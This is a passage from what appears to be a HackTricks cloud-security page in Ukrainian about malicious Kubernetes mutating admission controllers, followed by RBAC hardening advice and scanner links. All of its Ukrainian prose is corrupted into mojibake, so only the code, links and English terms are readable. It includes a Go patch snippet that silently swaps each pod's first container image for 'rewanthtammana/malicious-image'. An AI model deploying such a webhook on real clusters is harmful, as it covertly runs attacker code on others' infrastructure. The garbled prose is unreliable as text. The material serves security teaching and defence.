![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

–Ø–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –Ω–∞ –∑–∞–∑–Ω–∞—á–µ–Ω–æ–º—É –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ, –º–∏ —Å–ø—Ä–æ–±—É–≤–∞–ª–∏ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –æ–±—Ä–∞–∑ `nginx`, –∞–ª–µ —Ñ—ñ–Ω–∞–ª—å–Ω–∏–º –≤–∏–∫–æ–Ω–∞–Ω–∏–º –æ–±—Ä–∞–∑–æ–º —î `rewanthtammana/malicious-image`. –©–æ —Ç—ñ–ª—å–∫–∏ —â–æ —Å—Ç–∞–ª–æ—Å—è !!?

#### –¢–µ—Ö–Ω—ñ—á–Ω—ñ –¥–µ—Ç–∞–ª—ñ <a href="#heading-technicalities" id="heading-technicalities"></a>

–°—Ü–µ–Ω–∞—Ä—ñ–π `./deploy.sh` –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä –ø—Ä–∏–π–æ–º—É –º—É—Ç–∞—Ü—ñ–π–Ω–∏—Ö –≤–µ–±-–∑–∞–ø–∏—Ç—ñ–≤, —è–∫–∏–π –∑–º—ñ–Ω—é—î –∑–∞–ø–∏—Ç–∏ –¥–æ API Kubernetes, —è–∫ –≤–∫–∞–∑–∞–Ω–æ –≤ —Ä—è–¥–∫–∞—Ö –π–æ–≥–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó, –≤–ø–ª–∏–≤–∞—é—á–∏ –Ω–∞ —Å–ø–æ—Å—Ç–µ—Ä–µ–∂—É–≤–∞–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ä–æ–ª—è–º–∏ —Ç–∞ –∫–ª–∞—Å—Ç–µ—Ä–Ω–∏–º–∏ —Ä–æ–ª—è–º–∏ –≤ Kubernetes

–í–∏—â–µ–∑–∞–∑–Ω–∞—á–µ–Ω–∏–π —É—Ä–∏–≤–æ–∫ –∑–∞–º—ñ–Ω—é—î –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –ø–µ—Ä—à–æ–≥–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –≤ –∫–æ–∂–Ω–æ–º—É –∫–æ—Ç–µ–π–Ω–µ—Ä—ñ –Ω–∞ `rewanthtammana/malicious-image`.

## –û–±—Ö—ñ–¥ OPA Gatekeeper

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## –ù–∞–π–∫—Ä–∞—â—ñ –ø—Ä–∞–∫—Ç–∏–∫–∏

### **–í–∏–º–∫–Ω–µ–Ω–Ω—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –º–æ–Ω—Ç—É–≤–∞–Ω–Ω—è —Ç–æ–∫–µ–Ω—ñ–≤ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏**

* **–ö–æ—Ç–µ–π–Ω–µ—Ä–∏ —Ç–∞ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–±**: –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∫–æ—Ç–µ–π–Ω–µ—Ä–∏ –º–æ–Ω—Ç—É–≤–∞—Ç–∏–º—É—Ç—å —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏. –î–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ Kubernetes –¥–æ–∑–≤–æ–ª—è—î –≤–∏–º–∫–Ω–µ–Ω–Ω—è —Ü—ñ—î—ó —Ñ—É–Ω–∫—Ü—ñ—ó –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –º–æ–Ω—Ç—É–≤–∞–Ω–Ω—è.
* **–Ø–∫ –∑–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏**: –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å `automountServiceAccountToken: false` –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±–∏ –∞–±–æ –∫–æ—Ç–µ–π–Ω–µ—Ä—ñ–≤, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ –≤–µ—Ä—Å—ñ—ó Kubernetes 1.6.

### **–û–±–º–µ–∂–µ–Ω–Ω—è –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —É RoleBindings/ClusterRoleBindings**

* **–°–µ–ª–µ–∫—Ç–∏–≤–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è**: –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤ RoleBindings –∞–±–æ ClusterRoleBindings –≤–∫–ª—é—á–µ–Ω—ñ –ª–∏—à–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ. –†–µ–≥—É–ª—è—Ä–Ω–æ –∞—É–¥–∏—Ç—É–π—Ç–µ —Ç–∞ –≤–∏–¥–∞–ª—è–π—Ç–µ –Ω–µ–ø–æ—Ç—Ä—ñ–±–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è –∂–æ—Ä—Å—Ç–∫–æ—ó –±–µ–∑–ø–µ–∫–∏.

### **–†–æ–ª—ñ, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω, –Ω–∞–¥ –∫–ª–∞—Å—Ç–µ—Ä–Ω–∏–º–∏ —Ä–æ–ª—è–º–∏**

* **–†–æ–ª—ñ –ø—Ä–æ—Ç–∏ –ö–ª–∞—Å—Ç–µ—Ä–Ω–∏—Ö —Ä–æ–ª–µ–π**: –í—ñ–¥–¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤–∞–≥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é –†–æ–ª–µ–π —Ç–∞ RoleBindings –¥–ª—è –¥–æ–∑–≤–æ–ª—ñ–≤, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏—Ö –¥–ª—è –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω, –∞ –Ω–µ –ö–ª–∞—Å—Ç–µ—Ä–Ω–∏—Ö —Ä–æ–ª–µ–π —Ç–∞ ClusterRoleBindings, —è–∫—ñ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å—Å—è –Ω–∞ —Ä—ñ–≤–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞. –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –ø—Ä–æ–ø–æ–Ω—É—î –±—ñ–ª—å—à –¥—Ä—ñ–±–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å —Ç–∞ –æ–±–º–µ–∂—É—î –æ–±—Å—è–≥ –¥–æ–∑–≤–æ–ª—ñ–≤.

### **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **–ü–æ—Å–∏–ª–∞–Ω–Ω—è**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
